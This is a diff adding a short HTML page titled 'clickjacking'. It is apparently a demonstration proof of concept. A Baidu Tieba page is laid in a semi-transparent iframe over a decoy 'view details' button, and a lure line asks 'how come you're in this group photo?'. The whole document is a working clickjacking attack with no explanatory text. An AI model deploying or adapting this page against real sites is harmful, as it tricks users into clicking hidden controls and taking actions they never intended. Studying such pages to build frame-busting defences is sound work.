@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<head>
+<title>点击劫持</title>
+<style>
+    iframe{
+        opacity:0.3;
+        position:absolute;
+        z-index:2;
+        width: 100%;
+        height: 100%;
+    }
+    button{
+        position:absolute;
+        top: 345px;
+        left: 630px;
+        z-index: 1;
+        width: 72px;
+        height: 26px;
+    }
+</style>
+</head>
+<body>
+    这个合影里面怎么会有你？
+    <button>查看详情</button>
+    <iframe src="http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"></iframe>
+</body>
+</html>
